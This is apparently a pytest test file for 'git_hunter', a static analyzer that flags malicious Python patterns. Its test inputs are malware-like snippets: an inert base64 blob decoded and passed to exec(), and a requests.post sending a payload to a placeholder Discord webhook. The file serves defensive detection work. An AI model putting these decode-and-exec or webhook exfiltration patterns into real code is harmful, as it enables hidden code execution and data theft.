import tempfile
from pathlib import Path

from git_hunter.analyzer import analyze_python_files, analyze_python_sources


def test_only_flags_payload_when_it_reaches_execution_sink():
    with tempfile.TemporaryDirectory() as directory:
        blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
        Path(directory, "sample.py").write_text(f"value = '{blob}'\nprint(value)\n")
        result = analyze_python_files(directory)
    assert result["anomaly_score"] == 0
    assert result["findings"] == []


def test_benign_execution_sink_is_not_a_finding():
    result = analyze_python_sources({
        "sample.py": "command = input('command: ')\nsubprocess.run([command])\n",
    })

    assert result["anomaly_score"] == 0
    assert result["findings"] == []


def test_traces_decoded_payload_to_sink():
    blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
    result = analyze_python_sources({"sample.py": f"import base64\npayload = base64.b64decode('{blob}')\nexec(payload)\n"})
    assert result["anomaly_score"] == 75
    assert result["findings"][0]["kind"] == "traced_execution_sink"
    assert result["findings"][0]["source_var"] == "payload"


def test_malformed_python_is_visible_as_anomaly():
    result = analyze_python_sources({"broken.py": "def broken(:\n"})
    assert result["anomaly_score"] == 50
    assert result["findings"][0]["kind"] == "malformed_python"


def test_static_signatures_are_merged_and_scored():
    result = analyze_python_sources({
        "callback.py": "requests.post('https://discord.com/api/webhooks/example', data=payload)\n",
    })

    assert result["anomaly_score"] == 60
    assert result["findings"][0]["kind"] == "static_signature_match"
    assert result["findings"][0]["file"] == "callback.py"


def test_static_signature_score_caps_with_behavioral_findings():
    blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
    result = analyze_python_sources({
        "mixed.py": (
            f"payload = base64.b64decode('{blob}')\n"
            "exec(payload)\n"
            "requests.post('https://discord.com/api/webhooks/example', data=payload)\n"
        ),
    })

    assert result["anomaly_score"] == 100
    assert any(item["kind"] == "traced_execution_sink" for item in result["findings"])
    assert any(item["kind"] == "static_signature_match" for item in result["findings"])


def test_annotated_python_assignments_are_tracked():
    blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
    result = analyze_python_sources({
        "annotated.py": f"payload: str = base64.b64decode('{blob}')\nexec(payload)\n",
    })

    assert result["anomaly_score"] == 75
    assert result["findings"][0]["kind"] == "traced_execution_sink"


def test_keyword_payloads_reach_python_sinks():
    blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
    result = analyze_python_sources({
        "keyword.py": f"payload = base64.b64decode('{blob}')\nexec(source=payload)\n",
    })

    assert result["anomaly_score"] == 75
    assert result["findings"][0]["kind"] == "traced_execution_sink"